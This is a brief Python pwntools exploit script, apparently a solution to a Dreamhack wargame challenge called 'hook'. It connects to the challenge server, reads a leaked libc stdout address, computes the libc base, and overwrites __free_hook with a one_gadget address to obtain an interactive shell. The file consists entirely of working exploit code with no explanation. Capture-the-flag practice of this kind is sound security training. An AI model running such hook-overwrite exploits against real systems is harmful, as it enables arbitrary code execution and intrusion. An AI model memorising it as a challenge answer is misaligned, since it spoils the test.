from pwn import *

# p = process('./hook')
p = remote('host3.dreamhack.games',24317)
e = ELF('./hook')
libc = ELF('./libc-2.23.so')

p.recvuntil('stdout: ')
stdout = int(p.recvline()[:-1],16)
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']

free_hook = libc_base + libc.symbols['__free_hook']

one_gadget = libc_base + 0x4527a

payload = p64(free_hook)
payload += p64(one_gadget)

# p.recvuntil('Size: ')
# p.sendline('1000')
p.sendafter('Size: ', b'1000\n') # 위 주석과 동일
p.recvuntil('Data: ')
p.sendline(payload)

p.interactive()